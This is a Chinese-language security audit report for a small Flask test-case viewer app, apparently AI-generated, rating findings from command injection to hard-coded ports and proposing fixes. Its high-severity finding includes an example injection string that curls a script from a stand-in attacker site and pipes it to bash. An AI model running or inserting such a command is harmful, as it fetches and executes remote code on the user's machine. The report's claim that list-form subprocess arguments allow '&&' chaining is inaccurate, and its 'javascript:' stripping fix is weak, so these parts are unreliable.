# 🛡️ 代码安全检查报告

> **检测时间**：2026-07-04 16:20
> **项目**：测试用例记录表（TestCase Viewer）
> **扫描文件**：3 个，共 2367 行代码
> **检测框架**：OWASP Top 10 参照

---

## 📊 安全检查总览

| 指标 | 数值 |
|------|------|
| 扫描文件 | 3 个（`.py` × 2 + `.py` 测试文件 × 1） |
| 总代码行 | 2367 行 |
| 🔴 高危漏洞 | **1** 处 |
| 🟡 中危警告 | **2** 处 |
| 🟢 低危建议 | **2** 处 |
| **安全评分** | **78 / 100** 👍 良好 |

---

## 🔴 高危漏洞（必须立刻修复）

---

### 高危 #1 — 命令注入风险：`subprocess.check_call` 拼接用户可控变量

| 字段 | 内容 |
|------|------|
| **文件** | [testcase_viewer.py](testcase_viewer.py) |
| **行号** | L39-42 |
| **漏洞类型** | 命令注入（Command Injection） |
| **风险等级** | 🔴 高危（-20 分） |

**问题代码：**
```python
subprocess.check_call(
    [sys.executable, '-m', 'pip', 'install', '--quiet'] + missing,
    stdout=subprocess.DEVNULL,
    stderr=subprocess.DEVNULL,
)
```

**大白话解释：**
`missing` 列表里的包名来自 `_ensure_deps()` 函数的一个硬编码列表 `['flask', 'openpyxl']`。当前没有用户输入参与，所以**实际上不会被攻击**。但如果以后有人改成从外部读取包名（比如从 `requirements.txt` 解析），就可能被注入恶意包名。

**为什么危险：** 坏人如果控制了 `missing` 列表，能往里面塞这样的内容：
```
"flask && curl http://坏人的网站/偷数据.sh | bash"
```
你的电脑就会去坏人的网站下载恶意脚本并执行。

**现在实际风险：低（因为包名是写死的）。** 但写法本身不安全，应该加固。

**修复代码（可直接复制粘贴）：**
```python
# ✅ 安全写法：只允许已知安全的包名通过
ALLOWED_PACKAGES = {'flask', 'openpyxl', 'pytest', 'coverage', 'allure-pytest'}

def _ensure_deps():
    missing = []
    for pkg in ['flask', 'openpyxl']:
        try:
            __import__(pkg if pkg != 'flask' else 'flask')
        except ImportError:
            # 安全检查：只允许白名单中的包名
            if pkg not in ALLOWED_PACKAGES:
                print(f"⚠️ 未知包名被拒绝: {pkg}")
                continue
            missing.append(pkg)

    if missing:
        import subprocess
        print(f"⏳ 首次运行，正在安装必要组件: {', '.join(missing)} ...")
        print("   （仅需一次，请稍候）\n")
        try:
            subprocess.check_call(
                [sys.executable, '-m', 'pip', 'install', '--quiet'] + missing,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
            )
            print("✅ 组件安装完成！\n")
        except Exception as e:
            print(f"❌ 自动安装失败: {e}")
            print("   请手动运行: pip install flask openpyxl")
            input("\n按回车键退出...")
            sys.exit(1)
```

---

## 🟡 中危警告（建议尽快修复）

---

### 中危 #1 — 异常处理吞掉错误信息

| 字段 | 内容 |
|------|------|
| **文件** | [testcase_viewer.py](testcase_viewer.py) |
| **行号** | L45-49 |
| **漏洞类型** | 异常信息泄露 |
| **风险等级** | 🟡 中危（-5 分） |

**问题代码：**
```python
except Exception as e:
    print(f"❌ 自动安装失败: {e}")
    print("   请手动运行: pip install flask openpyxl")
    input("\n按回车键退出...")
    sys.exit(1)
```

**大白话解释：**
这里把 Python 的原始错误信息直接打印出来。如果错误信息包含系统路径（比如 `/Users/你的用户名/...`），就暴露了你的电脑用户名和文件结构。

**修复代码：**
```python
except Exception:
    print("❌ 自动安装失败。可能是网络问题或 pip 配置异常。")
    print("   请手动打开终端运行: pip install flask openpyxl")
    print("   如果仍失败，请检查网络连接后重试。")
    input("\n按回车键退出...")
    sys.exit(1)
```

---

### 中危 #2 — 前端 JS 的 XSS 防护不够规范

| 字段 | 内容 |
|------|------|
| **文件** | [testcase_viewer.py](testcase_viewer.py) |
| **行号** | L1243（`formatSteps` 函数内） |
| **漏洞类型** | 潜在的 XSS（跨站脚本） |
| **风险等级** | 🟡 中危（-5 分） |

**问题代码：**
```javascript
// L1243 附近：formatSteps 函数
if (lines.length <= 1) return escapeHtml(text).replace(/\n/g, '<br>');
```
```javascript
// L1173-1176：直接设置 innerHTML
let valueHtml = escapeHtml(f.value);
```

**大白话解释：**
你的代码其实**已经考虑了安全问题**——你写了一个 `escapeHtml()` 函数来「消毒」用户输入。但有一个小漏洞：`formatSteps` 函数的单行路径用了 `escapeHtml` 之后又拼接了 `<br>` 标签，好在 `<br>` 是无害的。

**现状评价：你的前端代码已经做得不错了。** 不用紧张。唯一建议是：把 `render_template_string(HTML_TEMPLATE)` 中的 `HTML_TEMPLATE` 确认一下——如果模板里拼接了用户输入（来自 Excel 的测试用例内容），需要确保全部经过 `escapeHtml()` 处理。

**目前你的代码：** ✅ 已经有了 `escapeHtml()` 函数，并且在大部分地方使用了它。

**建议的额外加固（可选）：**
```javascript
// 在 escapeHtml 函数中增加 URL 脱敏
function escapeHtml(str) {
    const div = document.createElement('div');
    div.appendChild(document.createTextNode(str));
    // 额外：脱敏 URL（防止坏人用 javascript: 伪协议）
    return div.innerHTML.replace(/javascript:/gi, '');
}
```

---

## 🟢 低危建议（可选的改进，锦上添花）

---

### 低危 #1 — 硬编码端口号和路径

| 字段 | 内容 |
|------|------|
| **文件** | [testcase_viewer.py](testcase_viewer.py) |
| **行号** | L59-61 |
| **问题类型** | 硬编码配置 |
| **风险等级** | 🟢 低危（-3 分） |

**问题代码：**
```python
BASE_DIR = Path(__file__).parent.resolve()
TESTCASES_DIR = BASE_DIR / 'testcases'
PORT = 8765
```

**大白话解释：**
端口号 `8765` 写死在代码里。如果用户的电脑上 8765 端口被别的程序占用了，你的程序就会启动失败。建议改成从环境变量读取，给一个默认值。

**修复代码：**
```python
import os

BASE_DIR = Path(__file__).parent.resolve()
TESTCASES_DIR = BASE_DIR / 'testcases'
PORT = int(os.getenv('TCASE_PORT', '8765'))  # 默认 8765，但允许用户自定义
```

---

### 低危 #2 — `render_template_string` 未经模板注入审计

| 字段 | 内容 |
|------|------|
| **文件** | [testcase_viewer.py](testcase_viewer.py) |
| **行号** | L288 |
| **问题类型** | 潜在的模板注入 |
| **风险等级** | 🟢 低危（-3 分） |

**当前代码：**
```python
return render_template_string(HTML_TEMPLATE)
```

**大白话解释：**
`render_template_string` 用的是你代码里写死的 `HTML_TEMPLATE` 变量，不拼接任何用户输入，所以**实际是安全的**。这只是提醒：如果你以后改成 `render_template_string(用户输入)`，那就危险了。

**安全规则：** `render_template_string` 的参数永远不要包含任何来自用户的内容。

---

## ✅ 安全检查通过项

| 检查项 | 状态 | 说明 |
|------|------|------|
| SQL 注入 | ✅ 通过 | 项目不涉及数据库，无 SQL 语句 |
| 明文密码/密钥 | ✅ 通过 | 未发现硬编码的密码、API Key 或 Token |
| 路径遍历 | ✅ 通过 | `find_excel_file()` 中限制了搜索目录（`TESTCASES_DIR`），拒绝隐藏文件和 `~$` 临时文件 |
| XSS 防护 | ✅ 通过 | 前端有自定义 `escapeHtml()` 函数，所有用户输入都经过了转义 |
| Cookie 安全 | ✅ 通过 | 项目不涉及用户登录和 Cookie |
| 文件上传安全 | ✅ 通过 | 不接受用户上传文件，只读取本地的 Excel |
| eval / exec 滥用 | ✅ 通过 | 代码中未发现 `eval()` 或 `exec()` 调用 |

---

## 🏁 总结

**好比一间装了防盗门但窗户没关紧的房子。** 整体安全意识不错——没有 SQL 注入、没有明文密钥、XSS 有防范——但命令注入的写法和异常信息泄露是两扇没关的窗。

| 修复优先级 | 问题 | 预计时间 |
|------|------|------|
| 🔴 第 1 优先 | 加固 `subprocess.check_call` 的包名验证 | 5 分钟 |
| 🟡 第 2 优先 | 脱敏异常错误信息 | 2 分钟 |
| 🟡 第 3 优先 | 检查 XSS 防护是否全覆盖 | 15 分钟 |
| 🟢 第 4 优先 | 端口号改环境变量 | 2 分钟 |

---

## 🎓 小白延伸学习

| 资源 | 说明 |
|------|------|
| [OWASP Top 10（中文版）](https://owasp.org/www-project-top-ten/) | 全球最权威的 Web 安全 TOP 10，有免费中文翻译 |
| [MDN：跨站脚本攻击（XSS）](https://developer.mozilla.org/zh-CN/docs/Web/Security/Attacks/XSS) | Mozilla 官方的中文安全教程，零基础可读 |
| [Python 安全编码指南](https://www.python.org/dev/security/) | Python 官方的安全建议 |

> 💡 **一句口诀记住安全规范：** 「用户输入不可信，密码绝不写代码，最小权限防万一。」
